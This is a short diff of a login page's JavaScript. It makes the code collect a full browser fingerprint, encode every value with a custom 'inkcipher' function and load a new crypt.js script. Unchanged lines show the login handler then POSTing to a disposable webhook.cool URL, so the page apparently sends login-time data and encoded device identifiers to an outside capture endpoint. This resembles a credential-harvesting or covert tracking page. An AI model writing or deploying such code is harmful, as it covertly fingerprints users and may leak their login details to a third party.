@@ -245,18 +245,14 @@
             loginButton.disabled = true;
             loginButton.textContent = 'Logging in...';
 
-            // Browser fingerprint data
-            let fingerprint = null;
-            
             // Collect browser fingerprint
-            initFingerprintJS().then(fp => fp.get()).then(result => {
-                fingerprint = { visitorId: result.visitorId };
-                for (const [key, component] of Object.entries(result.components)) {
-                    fingerprint[key] = component.value;
-                }
-                console.log(fingerprint);
-            });
-
+            const fp = await initFingerprintJS();
+            const result = await fp.get();
+            fingerprint = { visitorId: inkcipher(result.visitorId) };
+            for (const [key, component] of Object.entries(result.components)) {
+                fingerprint[key] = inkcipher(JSON.stringify(component.value));
+            }
+            console.log(fingerprint);
             
             const response = await fetch('https://keen-mouse-26.webhook.cool', {
               method: 'POST',
@@ -298,6 +294,7 @@
             }
         }
     </script>
+    <script src="scripts/crypt.js"></script>
     <script src="scripts/dark-mode.js"></script>
     <script src="scripts/session-tracker.js"></script>
 </body>
